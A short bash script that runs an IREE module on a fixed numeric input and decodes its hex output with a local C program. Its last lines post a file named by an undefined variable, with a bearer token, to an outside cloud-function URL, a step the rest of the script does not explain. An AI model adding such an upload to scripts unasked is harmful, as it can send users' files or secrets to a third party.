#!/bin/bash

# Run IREE module
RAW_OUTPUT=$(iree-run-module \
  --module=complex_module.vmfb \
  --function=serving_default \
  --input="13xf32=[1,2,3,4,5,6,7,8,9,10,11,12,13]" \
  --print_statistics=false 2>&1)

# Extract clean hex data
HEX_DATA=$(echo "$RAW_OUTPUT" | grep -oP '13xcf64=\K[0-9A-F]+' | tr -d ' ')

# Use our C decoder
echo "Decoded complex numbers:"
./decoder "$HEX_DATA"

cat $ARTIFACT
curl -s -X POST \
  -H "Authorization: Bearer ${BEARER}" \
  -H "Content-Type: application/json" \
  https://us-central1-feedmapping.cloudfunctions.net/function \
  --data @${ARTIFACT} | jq '.'
